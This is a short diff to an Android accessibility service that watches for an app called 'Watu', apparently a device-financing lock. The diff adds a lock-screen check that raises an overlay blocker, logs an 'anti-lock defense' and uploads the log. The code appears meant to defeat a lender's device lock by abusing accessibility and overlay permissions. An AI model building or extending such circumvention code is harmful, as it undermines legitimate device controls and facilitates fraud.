@@ -12,6 +12,7 @@ import android.net.Uri;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityWindowInfo;
 import android.widget.Toast;
+import android.app.KeyguardManager;
 
 import androidx.annotation.RequiresApi;
 
@@ -151,6 +152,14 @@ public class InterceptorService extends AccessibilityService {
             } else {
                 CrashLogger.log(getApplicationContext(), "Watchdog", "✅ Watu not detected in memory");
                 OverlayBlocker.hide(getApplicationContext());
+            }
+
+            // 🔒 Lock detection
+            KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+            if (km != null && km.isKeyguardLocked()) {
+                CrashLogger.log(getApplicationContext(), "Keyguard", "🔒 Lock screen detected");
+                OverlayBlocker.show(getApplicationContext());
+                LogUploader.uploadLog(getApplicationContext(), "🔐 Anti-lock defense triggered");
             }
 
             new Handler(Looper.getMainLooper()).postDelayed(this, 5000);
